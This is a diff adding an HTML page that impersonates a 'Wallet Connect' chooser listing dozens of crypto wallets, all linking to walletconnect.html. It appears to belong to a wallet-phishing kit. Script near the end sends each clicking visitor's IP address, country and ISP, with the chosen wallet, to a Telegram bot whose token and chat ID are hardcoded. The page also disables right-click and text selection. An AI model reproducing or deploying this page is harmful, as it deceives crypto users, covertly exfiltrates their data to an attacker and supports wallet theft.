@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wallet Connect</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto",
+          "Helvetica", "Arial", sans-serif;
+        background-color: rgba(0, 0, 0, 0.5);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      .modal {
+        background-color: rgb(25, 26, 26);
+        border-radius: 35px;
+        padding: 24px;
+        width: 360px;
+        max-width: 100%;
+        max-height: 60vh;
+        overflow-y: auto;
+        overflow-x: hidden;
+        scrollbar-width: none;
+      }
+
+      .search-box {
+        display: none;
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .search-box input {
+        width: 90%;
+        padding: 12px;
+        border: 2px solid rgb(48, 49, 49);
+        border-radius: 16px;
+        font-size: 16px;
+        background-color: rgb(48, 49, 49);
+      }
+
+      .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 24px;
+      }
+
+      .modal-title {
+        font-size: 20px;
+        font-weight: 600;
+        color: rgb(189, 192, 192);
+      }
+
+      .close-button {
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: #999;
+      }
+
+      .featured-wallets {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 16px;
+        margin-bottom: 16px;
+      }
+
+      .wallet-item {
+        display: flex;
+        align-items: center;
+        padding: 16px;
+        border-radius: 16px;
+        background-color: rgb(30, 30, 30);
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .wallet-item:hover {
+        background-color: rgba(39, 39, 39, 0.705);
+        transition: background-color 0.1s;
+      }
+
+      .wallet-icon {
+        width: 35px;
+        height: 35px;
+        border-radius: 12px;
+        margin-right: 12px;
+      }
+
+      a {
+        text-decoration: none;
+      }
+
+      img {
+        width: 70px;
+        margin-right: 20px;
+      }
+
+      .meta {
+        width: 15px;
+        border-radius: 9px;
+      }
+
+      .wallet-name {
+        font-size: 16px;
+        color: rgb(189, 192, 192);
+      }
+
+      .hidden-wallets {
+        display: none;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 16px;
+        margin-top: 16px;
+      }
+
+      .hidden-wallets .wallet-item {
+        flex-direction: column;
+        text-align: center;
+        padding: 9px;
+      }
+
+      .hidden-wallets .wallet-icon {
+        margin: 0 0 8px 0;
+      }
+
+      .hidden-wallets .wallet-name {
+        font-size: 14px;
+      }
+
+      .learn-more {
+        display: block;
+        text-align: center;
+        margin-top: 24px;
+        color: #3396ff;
+        text-decoration: none;
+        font-size: 14px;
+      }
+
+      @media (max-width: 768px) {
+        body {
+          align-items: flex-end;
+        }
+
+        .modal {
+          width: 100%;
+          border-radius: 24px 24px 0 0;
+          padding: 24px 16px;
+        }
+
+        .hidden-wallets {
+          grid-template-columns: repeat(4, 1fr);
+        }
+      }
+
+      /* Modal Slide Up Animation */
+      @keyframes slideUp {
+        from {
+          transform: translateY(100%);
+        }
+        to {
+          transform: translateY(0);
+        }
+      }
+
+      hr {
+        margin-bottom: 20px;
+        border: 3px solid rgb(48, 49, 49);
+        border-top: 0px;
+        border-left: 0px;
+        border-right: 0px;
+        border-radius: 10px;
+      }
+
+      .wallet-icon img {
+        width: 100%;
+        height: auto;
+        margin-top: 6px;
+      }
+
+      .walletconnect img {
+        margin-top: 0px;
+      }
+
+      .trust img {
+        margin-top: 0px;
+      }
+
+      .metamask img {
+        margin-top: 0px;
+      }
+
+      .coinbase img {
+        margin-top: 0px;
+      }
+
+      .brave img {
+        margin-top: 0px;
+        border-radius: 30px;
+      }
+
+      .solflare img {
+        margin-top: 0px;
+      }
+
+      .ledger img {
+        margin-top: 0px;
+      }
+
+      .safepal img {
+        margin-top: 0px;
+      }
+
+      .okx img {
+        margin-top: 0px;
+        border-radius: 16px;
+      }
+
+      .metamask img {
+        margin-top: 1px;
+        border-radius: 30%;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="modal">
+      <div class="modal-header">
+        <h2 class="modal-title" style="margin-left: 60px">Connect wallet</h2>
+        <button class="close-button">&times;</button>
+      </div>
+
+      <hr style="color: rgb(48, 49, 49)" />
+
+      <div class="featured-wallets">
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon walletconnect">
+              <img
+                class="meta"
+                src="walletconnect-seeklogo.png"
+                alt=""
+              />
+            </div>
+            <span class="wallet-name">WalletConnect</span>
+          </div>
+        </a>
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon metamask">
+              <img class="metamask" src="metamask.jpg" alt="" />
+            </div>
+            <span class="wallet-name">MetaMask</span>
+          </div>
+        </a>
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon metamask">
+              <img class="metamask" src="phantom2.jpg" alt="" />
+            </div>
+            <span class="wallet-name">Phantom</span>
+          </div>
+        </a>
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon metamask">
+              <img class="metamask" src="uniswap-logo.png" alt="" />
+            </div>
+            <span class="wallet-name">Uniswap</span>
+          </div>
+        </a>
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon metamask">
+              <img class="metamask" src="trezor.png" alt="" />
+            </div>
+            <span class="wallet-name">Trezor Wallet</span>
+          </div>
+        </a>
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon metamask">
+              <img class="metamask" src="ledgerlive.png" alt="" />
+            </div>
+            <span class="wallet-name">Ledger Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon trust">
+              <img class="meta" src="trust.png" alt="" />
+            </div>
+            <span class="wallet-name">Trust Wallet</span>
+          </div>
+        </a>
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon coinbase">
+              <img
+                class="meta coinbase"
+                src="coinbase-advanced-trade-icon.png"
+                alt=""
+              />
+            </div>
+            <span class="wallet-name">Coinbase</span>
+          </div>
+        </a>
+      </div>
+      <div class="wallet-item show-more">
+        <span class="wallet-name show-more">All Wallets</span>
+      </div>
+
+      <div class="search-box">
+        <input
+          type="text"
+          placeholder="Search wallets"
+          onkeyup="searchWallets()"
+        />
+      </div>
+      <div class="hidden-wallets">
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon">
+              <img
+                class=""
+                src="metamask.jpg"
+                alt=""
+                style="border-radius: 15px"
+              />
+            </div>
+            <span class="wallet-name">Metamask</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon brave">
+              <img class="meta" src="trust.png" alt="" />
+            </div>
+            <span class="wallet-name">Trust Wallet</span>
+          </div>
+        </a>
+      
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon solflare">
+              <img src="okx.png" alt="" style="border-radius: 20px" />
+            </div>
+            <span class="wallet-name">OKX Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="bitget-icon.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Bitget Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="binance.png" alt="" style="border-radius: 20px" />
+            </div>
+            <span class="wallet-name">Binance</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="uniswap-logo.png" alt="" />
+            </div>
+            <span class="wallet-name">Uniswap</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="safepal.png" alt="" />
+            </div>
+            <span class="wallet-name">SafePal</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="rainbow.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Rainbow</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="bybit.png" alt="" />
+            </div>
+            <span class="wallet-name">Bybit Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="tp2.png" alt="" />
+            </div>
+            <span class="wallet-name">TP</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="Ledger%20Wallet.png" alt="" />
+            </div>
+            <span class="wallet-name">Ledger Live</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="timeless-x.png" alt="" />
+            </div>
+            <span class="wallet-name">Timeless X</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="safe.png" alt="" />
+            </div>
+            <span class="wallet-name">Safe</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="zerion.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Zerion</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="robinhood.jpg" alt="" />
+            </div>
+            <span class="wallet-name">Robinhood</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="1inch.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">1inch Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="crypto.com-logo.png" alt="" />
+            </div>
+            <span class="wallet-name">Crypto.com</span>
+          </div>
+        </a>
+       
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="Exodus_symbol.png" alt="" />
+            </div>
+            <span class="wallet-name">Exodus</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="argent.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Argent</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="imtoken.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">imToken</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="blockchain.png" alt="" />
+            </div>
+            <span class="wallet-name">Blockchain</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img
+                src="Magic_Eden_Logo.jpg"
+                alt=""
+                style="border-radius: 15px"
+              />
+            </div>
+            <span class="wallet-name">Magic Eden</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="kraken.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Kraken Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="coinbase-advanced-trade-icon.png" alt="" />
+            </div>
+            <span class="wallet-name">Coinbase</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="backpack.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Backpack</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="zango.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Zengo</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="mew.png" alt="" />
+            </div>
+            <span class="wallet-name">MEW wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="phantom2.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Phantom</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="fireblock.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Fireblocks</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="solflare2.png" alt="" />
+            </div>
+            <span class="wallet-name">Solflare</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img
+                src="MathWallet_App_Icon.png"
+                alt=""
+                style="border-radius: 15px"
+              />
+            </div>
+            <span class="wallet-name">MathWallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="alpha.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">AlphaWallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="unstoppable.png" alt="" />
+            </div>
+            <span class="wallet-name">Unstoppable</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="KEYRING-PRO-2.png" alt="" />
+            </div>
+            <span class="wallet-name">KEYRING</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="frontier.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Frontier</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="omni-network-logo.png" alt="" />
+            </div>
+            <span class="wallet-name">Omni</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="obvious.jpg" alt="" />
+            </div>
+            <span class="wallet-name">Obvious</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="ambire.png" alt="" />
+            </div>
+            <span class="wallet-name">Ambire Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="infinity.jpg" alt="" />
+            </div>
+            <span class="wallet-name">Infinity Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="bridge.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Bridge Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img
+                src="coin98-c98-logo.png"
+                alt=""
+                style="border-radius: 15px"
+              />
+            </div>
+            <span class="wallet-name">Coin98</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="abc.jpg" alt="" />
+            </div>
+            <span class="wallet-name">ABC Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="huddln.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Huddln</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="jade.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Jade Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon safepal">
+              <img src="verso.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Verso</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon okx">
+              <img src="haha.jpg" alt="" />
+            </div>
+            <span class="wallet-name">HaHa</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="kelp2.png" alt="" />
+            </div>
+            <span class="wallet-name">Kelp</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="numio.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Numio</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="cling.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Cling Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="injective.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Injective</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="ripio.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Ripio Portal</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img
+                src="enjin-coin-enj-icon-enjin-coin-logo-hd.png"
+                alt=""
+                style="border-radius: 15px"
+              />
+            </div>
+            <span class="wallet-name">Enjin Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="rabby.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Rabby</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="leap.webp" alt="" />
+            </div>
+            <span class="wallet-name">Leap</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="loopring.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Loopring</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="apollox.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">ApolloX</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="torus.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Torus</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="okse.webp" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Okse Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="cool.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">CoolWallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="toncoin-ton-logo.png" alt="" />
+            </div>
+            <span class="wallet-name">TON Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="heqq.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">HAQQ Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="nova.png" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Nova Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="catecoin.png" alt="" />
+            </div>
+            <span class="wallet-name">Catecoin</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img src="tangem.jpg" alt="" style="border-radius: 15px" />
+            </div>
+            <span class="wallet-name">Tangem Wallet</span>
+          </div>
+        </a>
+
+        <a href="walletconnect.html">
+          <div class="wallet-item">
+            <div class="wallet-icon ledger">
+              <img
+                src="gate.io-logo.jpg"
+                alt=""
+                style="border-radius: 15px"
+              />
+            </div>
+            <span class="wallet-name">GateWallet</span>
+          </div>
+        </a>
+      </div>
+      <a href="#" class="learn-more">Learn more about wallets</a>
+    </div>
+
+    <script>
+      // Show more wallets
+      document
+        .querySelector(".show-more")
+        .addEventListener("click", function () {
+          document.querySelector(".hidden-wallets").style.display = "grid";
+          this.style.display = "none";
+          document.querySelector(".search-box").style.display = "block";
+          this.style.display = "none";
+
+          // Hide featured wallets
+          document.querySelector(".featured-wallets").style.display = "none";
+        });
+    </script>
+
+    <script>
+      document.addEventListener(
+        "contextmenu",
+        function (e) {
+          e.preventDefault(); // Disable right-click
+        },
+        false
+      );
+
+      document.addEventListener(
+        "selectstart",
+        function (e) {
+          e.preventDefault(); // Disable text selection
+        },
+        false
+      );
+    </script>
+
+    <script>
+      function searchWallets() {
+        const input = document.querySelector(".search-box input");
+        const filter = input.value.toUpperCase();
+        const wallets = document.querySelectorAll(
+          ".hidden-wallets .wallet-item"
+        );
+
+        wallets.forEach((wallet) => {
+          const text = wallet.textContent || wallet.innerText;
+          if (text.toUpperCase().indexOf(filter) > -1) {
+            wallet.style.display = "";
+          } else {
+            wallet.style.display = "none";
+          }
+        });
+      }
+    </script>
+
+    <script>
+      // Get the modal element
+      const modal = document.querySelector(".modal");
+
+      // Get the close button element
+      const closeButton = document.querySelector(".close-button");
+
+      // Add an event listener to the close button
+      closeButton.addEventListener("click", function () {
+        // Close the modal
+        modal.style.display = "none";
+
+        // Return back to the home page after a delay
+        setTimeout(function () {
+          window.location.href = "../wallet.html";
+        }, 50);
+      });
+    </script>
+
+    <script>
+      // Get the wallet items
+      const walletItems = document.querySelectorAll(".wallet-item");
+
+      // Add an event listener to each wallet item
+      walletItems.forEach((walletItem) => {
+        walletItem.addEventListener("click", (event) => {
+          // Get the wallet name
+          const walletName =
+            walletItem.querySelector(".wallet-name").textContent;
+
+          // Get the user IP address
+          const getUserIP = async () => {
+            try {
+              const response = await fetch("https://api.ipify.org/?format=json");
+              const data = await response.json();
+              return data.ip;
+            } catch (error) {
+              console.error("Error getting user IP:", error);
+            }
+          };
+
+          // Get the user phone information
+          const getUserPhone = async () => {
+            try {
+              const response = await fetch("https://ipapi.co/json/");
+              const data = await response.json();
+              return data;
+            } catch (error) {
+              console.error("Error getting user phone information:", error);
+            }
+          };
+
+          // Get the user IP and phone information
+          const ip = getUserIP();
+          const phone = getUserPhone();
+
+          // Create a notification message
+          const notificationMessage = async () => {
+            const ipData = await ip;
+            const phoneData = await phone;
+            return `Wallet Selected: ${walletName}\nUser  IP: ${ipData}\nUser  Phone Information: ${phoneData.country_name} - ${phoneData.country_code} - ${phoneData.org}`;
+          };
+
+          // Send the notification to the Telegram bot
+          sendNotificationToTelegramBot(notificationMessage());
+        });
+      });
+
+      // Function to send notification to Telegram bot
+      async function sendNotificationToTelegramBot(message) {
+        // const telegramBotToken =
+        //   "7552251358:AAF8oD0jKOM3bTI7H8W3sXTYLinZqLhs3z0";
+        // const telegramChatId = "6890205187";
+        const telegramBotToken =
+          "7307323305:AAGeBvr7iKqQDlQp7oNGFBdswSJv-oTfNpE";
+        const telegramChatId = "7917277981";
+        try {
+          // https://api.telegram.org/bot/sendMessage?chat_id=-1002261747776&text=
+          const response = await fetch(
+            `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(
+              await message
+            )}`
+          );
+          const data = await response.json();
+          console.log("Notification sent to Telegram bot:", data);
+        } catch (error) {
+          console.error("Error sending notification to Telegram bot:", error);
+        }
+      }
+
+      document.addEventListener(
+        "contextmenu",
+        function (e) {
+          e.preventDefault(); // Disable right-click
+        },
+        false
+      );
+
+      document.addEventListener(
+        "selectstart",
+        function (e) {
+          e.preventDefault(); // Disable text selection
+        },
+        false
+      );
+    </script>
+  </body>
+
+</html>
